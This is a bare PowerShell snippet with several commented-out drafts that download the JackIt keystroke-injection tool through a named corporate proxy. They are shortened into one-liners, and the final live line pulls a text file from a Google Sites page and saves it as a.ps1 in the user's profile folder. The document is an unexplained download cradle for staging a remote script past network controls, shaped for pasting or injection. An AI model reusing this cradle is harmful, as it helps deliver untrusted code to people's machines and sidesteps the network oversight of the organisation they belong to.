#$source = "https://github.com/insecurityofthings/jackit/blob/master/jackit.py"
#$dest = $env:USERPROFILE + "\test.py"
#$WebClient = New-Object System.Net.WebClient
#$WebProxy = New-Object System.Net.WebProxy("http://outproxy1.pnet.ch:3128",$true)
#$WebClient.Proxy = $WebProxy
#$WebClient.DownloadFile($source,$dest)

#$source = "https://github.com/insecurityofthings/jackit/blob/master/jackit.py";$dest = $env:USERPROFILE + "\test.py";$WebClient = New-Object System.Net.WebClient;$WebProxy = New-Object System.Net.WebProxy("http://outproxy1.pnet.ch:3128",$true);$WebClient.Proxy = $WebProxy;$WebClient.DownloadFile($source,$dest);
#$Wc=New-Object Net.WebClient;$Wc.Proxy=New-Object Net.WebProxy("http://outproxy1.pnet.ch:3128",$true);$Wc.DownloadFile("https://github.com/insecurityofthings/jackit/blob/master/jackit.py",$env:USERPROFILE + "\test.py");
$W=New-Object Net.WebClient;$W.Proxy=New-Object Net.WebProxy("http://outproxy1.pnet.ch:3128");$W.DownloadFile("https://sites.google.com/site/dongleapp/Unbenannt1.txt",$env:USERPROFILE+"\a.ps1")